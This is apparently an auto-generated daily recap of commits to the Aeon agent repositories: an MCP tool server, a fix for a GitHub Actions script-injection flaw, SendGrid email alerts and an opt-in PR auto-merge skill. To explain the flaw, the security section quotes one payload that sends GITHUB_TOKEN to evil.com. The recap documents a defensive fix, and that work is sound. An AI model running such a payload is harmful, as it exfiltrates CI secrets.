# Push Recap — 2026-04-14

## Overview

A dense 24-hour window across both repos: 4 feature PRs merged into `aaronjmars/aeon` (MCP distribution layer, critical security fix, email notifications, auto-merge) plus 3 significant commits on `aaronjmars/aeon-agent` (two new content skills, a model-parsing bugfix, and a widened self-improve scan window). The dominant theme is Aeon crossing from GitHub Actions-only reach into direct Claude tool integration via MCP, while hardening security and closing the self-improvement feedback loop.

**Stats:** ~22 files changed, +1159 / -18 lines across 7 significant commits (plus 10 operational chore commits from scheduled skills)

---

## aaronjmars/aeon

### New Distribution Layer: MCP Skill Adaptor

**Summary:** Aeon now ships as a native Claude tool. Any Claude Desktop or Claude Code user can run all 54+ Aeon skills directly from their Claude chat window with a single setup command — no GitHub Actions required. This is the first distribution channel that decouples skill execution from the cron schedule entirely.

**Commits:**
- `308c128` — feat: add MCP skill adaptor — expose all Aeon skills as Claude tools (#28)
  - New file `mcp-server/src/index.ts` (224 lines): TypeScript MCP server using `@modelcontextprotocol/sdk`. On startup, reads `skills.json` and registers one tool per skill under the name `aeon-<slug>` (e.g. `aeon-article`, `aeon-hacker-news-digest`). Each tool accepts an optional `var` argument. On invocation, spawns `claude -p -` with the skill's SKILL.md prompt — identical to how GitHub Actions runs skills, so local and scheduled runs produce identical output.
  - New file `mcp-server/package.json` + `tsconfig.json` (42 lines combined): TypeScript ESM build targeting Node 18+. Dependencies: `@modelcontextprotocol/sdk`.
  - New file `add-mcp` (164 lines): Install script that runs `npm install && tsc`, then registers the server with `claude mcp add`. Supports `--desktop` flag for Claude Desktop JSON config snippet and `--uninstall` for cleanup. Zero manual config required.
  - Modified `README.md` (+31): New "Use with Claude (MCP)" section with one-command install example and three usage examples (`aeon-morning-brief`, `aeon-token-report`, `aeon-deep-research`).

**Impact:** Shifts Aeon from "thing you fork and schedule" to "tool you install once and call whenever." Users can invoke skills inline in their Claude conversations without touching GitHub at all. The execution path is identical to cron — the MCP server is a thin dispatch layer, not a reimplementation.

---

### Critical Security Fix: Script Injection in messages.yml

**Summary:** Two critical and two medium-severity script injection vectors in the message-handling workflow were identified and auto-fixed. The vulnerability allowed any Telegram/Discord/Slack channel member to execute arbitrary shell commands with full access to `GITHUB_TOKEN`, `ANTHROPIC_API_KEY`, and all other job secrets.

**Commits:**
- `a93d3b2` — fix(security): harden messages.yml against script injection via user messages (#29)
  - Modified `.github/workflows/messages.yml` (+25/-11): GitHub Actions evaluates `${{ inputs.message }}` and `${{ steps.msg.outputs.* }}` as template expressions before the shell runs, so a crafted message like `$(curl https://evil.com/?t=$GITHUB_TOKEN)` would execute at assignment time. The fix: declare every user-controlled expression as an `env:` variable on the step (`_INPUT_MESSAGE`, `_MSG_SOURCE`, `_LOG_SOURCE`, `_COMMIT_SOURCE`, etc.), then reference the env var in the shell. Bash does not re-evaluate env var contents as commands.
  - New file `articles/workflow-security-audit-2026-04-11.md` (184 lines): Full audit report with severity ratings, affected patterns, before/after code examples, and a manual-review checklist for remaining medium findings (action pinning, split job permissions, `GH_GLOBAL` scope audit).
  - New file `skills/workflow-security-audit/SKILL.md` (114 lines): On-demand skill that audits all `.github/workflows/*.yml` for the five vulnerability categories: script injection, over-broad permissions, unpinned actions, secret exposure, fleet dispatch injection.

**Impact:** Eliminates the attack surface created by user-controlled message content flowing into shell `run:` blocks. Any project that uses Aeon's messaging workflow should apply the same env-var intermediary pattern to their copy.

---

### Infrastructure: Fourth Notification Channel (Email via SendGrid)

**Summary:** Email joins Telegram, Discord, and Slack as an opt-in notification destination. All existing `./notify` calls automatically fan out to email when the two new secrets are set — no skill changes needed.

**Commits:**
- `1c6b600` — feat: add email notification channel via SendGrid (#30)
  - Modified `.github/workflows/aeon.yml` (+22): Added `SENDGRID_API_KEY`, `NOTIFY_EMAIL_TO`, `NOTIFY_EMAIL_FROM`, and `NOTIFY_EMAIL_SUBJECT_PREFIX` to the skill-run step's `env:` block. `NOTIFY_EMAIL_FROM` and `NOTIFY_EMAIL_SUBJECT_PREFIX` are repo *variables* (not secrets), defaulting to `aeon@notifications.aeon.bot` and `[Aeon]` respectively.
  - The notify script block in `aeon.yml` (+22 lines): `curl` call to `https://api.sendgrid.com/v3/mail/send` with both `text/plain` and `text/html` bodies. The HTML body wraps the plaintext in a `<pre>` tag for readability. Uses `jq -n` to safely build the JSON payload — no shell interpolation of message content.
  - Modified `dashboard/app/api/secrets/route.ts` and `SecretsPanel.tsx`: Added "Email" group in the secrets panel with `SENDGRID_API_KEY` and `NOTIFY_EMAIL_TO` fields.
  - Modified `README.md` (+3/-1): Updated notifications table to include Email row.

**Impact:** Operators who want a paper trail or need notifications in environments where Telegram/Discord/Slack are blocked can now receive everything via email. The channel is strictly opt-in — zero secrets set means the block is silently skipped.

---

### Agent Self-Repair: Auto-Merge Closes the Self-Improve Loop

**Summary:** A new `auto-merge` skill merges PRs that are fully green (passing CI, no blocking reviews, MERGEABLE state) up to 3 per run. This directly unblocks the self-improve cycle, which was stalling at the 3-PR guard whenever multiple feature PRs queued up faster than they were manually merged.

**Commits:**
- `aac9d9a` — feat: auto-merge skill — merge green PRs and unblock self-improve cycle (#31)
  - New file `skills/auto-merge/SKILL.md` (47 lines): Lists open PRs via `gh pr list`, filters to `mergeable == MERGEABLE` + no `CHANGES_REQUESTED` + all status checks `SUCCESS`/`NEUTRAL`/`SKIPPED`. Merges up to 3 per run via `gh pr merge --squash --delete-branch`. Logs skipped PRs with reasons (conflicts, pending CI, blocking review). Only sends a notification if at least one PR was actually merged.
  - Modified `aeon.yml` (+1): Added `auto-merge: { enabled: false, schedule: "0 14 * * *" }` — scheduled daily at 2 PM UTC, disabled by default to let operators opt in.

**Impact:** The self-improve cycle (self-improve → feature PR → review → merge → repeat) was breaking down with more than 3 PRs open simultaneously. Auto-merge closes this gap: green PRs merge automatically, freeing the 3-PR guard to allow new feature branches. The skill is the first that directly acts on the repo's own PR queue rather than producing content or analysis.

---

## aaronjmars/aeon-agent

### New Content Skills: Weekly Shiplog + Project Lens

**Summary:** Two new content skills were committed directly to the agent's skill library and scheduled. `weekly-shiplog` produces a Monday narrative of the full week's shipping; `project-lens` writes articles that connect the project to external events, trends, or big ideas — a different angle each run, never repeating within 14 days.

**Commits:**
- `878effb` — Add weekly-shiplog and project-lens skills, make push-recap daily
  - New file `skills/weekly-shiplog/SKILL.md` (95 lines): Aggregates 7 days of commits + merged PRs + releases across watched repos. Reads any existing push-recap articles to avoid re-fetching diffs. Produces an 800–1200 word narrative article with big-picture summary, feature sections, numbers breakdown, and momentum assessment. Scheduled Mondays at 9 AM UTC.
  - New file `skills/project-lens/SKILL.md` (92 lines): Defines 8 angle categories (current events, philosophy, industry comparison, user story, contrarian take, technical deep-dive, historical parallel, ecosystem map). Checks last 14 days of `articles/project-lens-*.md` to avoid repeating angles. Researches the external connection via WebSearch + WebFetch, then writes a 700–1000 word article leading with the lens, not the project. Scheduled Mon/Wed/Fri at 4 PM UTC.
  - Modified `aeon.yml` (+9/-3): `push-recap` moved from `*/2` (every 2 days) to `0 15 * * *` (daily). `project-lens` added at `0 16 * * 1,3,5`. `weekly-shiplog` added at `0 9 * * 1`. `repo-article` shifted to even days only (`*/2 * * 0,2,4,6`) to avoid overlap with `project-lens` on Mon/Wed/Fri.

**Impact:** Aeon now has two distinct article tracks: `repo-article` (technical/progress-focused) and `project-lens` (editorially varied, outward-facing). Combined with `weekly-shiplog`, the agent produces a complete content cadence: daily diffs (push-recap), varied editorial (project-lens 3x/week), progress articles (repo-article 4x/week), and a weekly narrative roundup (weekly-shiplog on Mondays).

---

### Bugfixes: Model Parsing and Self-Improve Scan Window

**Summary:** Two bugs that were silently degrading agent operations were fixed: inline YAML comments were being appended to model names (breaking memory-flush on every run), and self-improve was only scanning the last 24 hours of logs despite running on a 48-hour cycle.

**Commits:**
- `4daf021` — fix(workflow): strip YAML comments from model parsing
  - Modified `.github/workflows/aeon.yml` (+1/-1): The `sed` pipeline that extracts per-skill model names was not stripping inline comments. A skill entry like `model: "claude-sonnet-4-6" # Sun + Wed` would produce `MODEL=claude-sonnet-4-6#Sun+Wed`, which the API rejects as an unknown model. Fix: prepend `sed 's/#.*//'` to strip the comment before model name extraction.

- `c313a20` — Merge pull request #8: widen self-improve log scan from 24h to 2 days
  - Modified `skills/self-improve/SKILL.md` (+1/-1): Changed "last 24 hours" → "last 2 days" in step 2b. The self-improve skill runs on a `*/2` cron (every 2 days), so with a 24-hour window, the entire previous day's logs were invisible to the assessment — any errors, failures, or quality issues logged on the intervening day were never seen.
  - Modified `memory/logs/2026-04-12.md` (+6): Added log entry documenting the issue and fix.

**Impact:** Both fixes close silent failure modes — one that made every scheduled memory-flush fail (model validation error), one that made self-improve assessments miss half of agent activity. Neither would have surfaced without careful log review.

---

## Developer Notes

- **New dependencies:** `@modelcontextprotocol/sdk` (MCP server), `typescript` (dev dep for mcp-server build)
- **No breaking changes** to existing skill files or the `aeon.yml` format
- **New skill scheduling conventions:** `project-lens` uses day-of-week cron (`* * 1,3,5`). `repo-article` now has a day-of-week restriction too (`*/2 * * 0,2,4,6`). Both reflect intentional coordination to avoid skill collisions on the same day.
- **Security debt remaining:** Three findings from the workflow audit still require manual action: pin `actions/checkout`/`actions/setup-node` to commit SHAs (medium effort), split `messages.yml` job permissions to grant `actions: write` only to the `poll` job, audit `GH_GLOBAL` usage in `scheduler.yml`.
- **MCP server not yet in `skills.json`:** `mcp-skill-adaptor` is listed in `MEMORY.md` but the server is a meta-tool, not a skill — it won't appear in its own tool list, which is correct.

## What's Next

- The `skill-version-tracking` PR (#32 on aaronjmars/aeon) is open as of today — adds `skills.lock` provenance tracking and a `skill-update-check` skill for upstream diff alerts. This is the next merge candidate once CI passes.
- `weekly-shiplog` and `project-lens` will have their first runs this week (project-lens: next Mon/Wed/Fri window, weekly-shiplog: Monday 9 AM UTC).
- The three medium/low security findings from the workflow audit are still open for manual review — no automation path for pinning action SHAs or splitting job-level permissions.
- Auto-merge is deployed but disabled by default — operators need to explicitly set `enabled: true` in their `aeon.yml` to activate it.
